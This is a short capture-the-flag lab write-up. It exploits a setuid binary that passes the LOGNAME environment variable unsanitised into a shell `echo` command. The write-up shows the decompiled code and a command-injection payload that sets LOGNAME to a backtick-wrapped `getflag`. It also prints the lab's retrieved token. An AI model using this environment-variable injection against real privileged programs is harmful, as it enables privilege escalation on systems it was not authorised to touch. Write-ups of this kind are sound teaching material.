# Level07 Writeup

## Objective
Gain access to the `flag07` user and retrieve the password for `level08`.

## Steps Taken

1. **Initial Inspection**  
   Listing files in the home directory showed the following executable:
   ```
   -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
   ```
   This binary is owned by `flag07` and executable by `level07`.

2. **Binary Analysis**  
   I analyzed the binary using the online tool [Dogbolt.org](https://dogbolt.org/) and found the following logic in the code:
   ```c
   pcVar1 = getenv("LOGNAME");
   asprintf(&local_1c,"/bin/echo %s ",pcVar1);
   ```
   This means the program reads the `LOGNAME` environment variable and builds a shell command with it.
   This means it prints the value of the `LOGNAME` environment variable using `echo`.

3. **Exploitation via Environment Variable**  
   Since the program uses the `LOGNAME` variable without sanitization, I was able to inject a command:
   ```bash
   export LOGNAME=\`getflag\`
   ```
   Then, I executed the binary:
   ```bash
   ./level07
   ```

4. **Retrieve the Flag**  
   The output was:
   ```
   Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
   ```

## Result
Successfully retrieved the password for `level08`:  
```
fiumuikeil55xe9cu4dood66h
```
